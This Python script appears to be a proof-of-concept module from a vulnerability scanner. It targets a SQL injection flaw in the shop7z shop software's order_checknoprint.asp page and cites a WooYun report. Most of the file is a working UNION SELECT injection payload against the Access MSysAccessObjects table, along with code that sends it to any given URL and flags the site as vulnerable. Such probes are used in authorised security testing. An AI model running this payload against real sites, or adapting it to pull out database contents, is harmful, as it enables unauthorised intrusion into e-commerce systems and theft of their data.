#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: shop7z order_checknoprint.asp SQL注入
referer: http://www.wooyun.org/bugs/wooyun-2010-068345
author: Lucifer
description: 文件order_checknoprint.asp中,参数id存在SQL注入。
'''
import sys
import requests



class shop7z_order_checknoprint_sqli_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/order_checknoprint.asp?checkno=1&id=1%20UNION%20SELECT%201%2C2%2CCHR%2832%29%2bCHR%2835%29%2bCHR%28116%29%2bCHR%28121%29%2bCHR%28113%29%2bCHR%2835%29%2C4%2C5%2C6%2C7%2C8%2C9%2C10%2C11%2C12%2C13%2C14%2C15%2C16%2C17%2C18%2C19%2C20%2C21%2C22%2C23%2C24%2C25%2C26%2C27%2C28%2C29%2C30%2C31%2C32%2C33%2C34%2C35%2C36%2C37%2C38%2C39%2C40%2C41%2C42%20from%20MSysAccessObjects"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if r"#tyq#" in req.text:
                return "[+]存在shop7z order_checknoprint.asp SQL注入漏洞...(高危)\tpayload: "+vulnurl

        except:
            return "[-]connect timeout"

if __name__ == "__main__":

    testVuln = shop7z_order_checknoprint_sqli_BaseVerify(sys.argv[1])
    testVuln.run()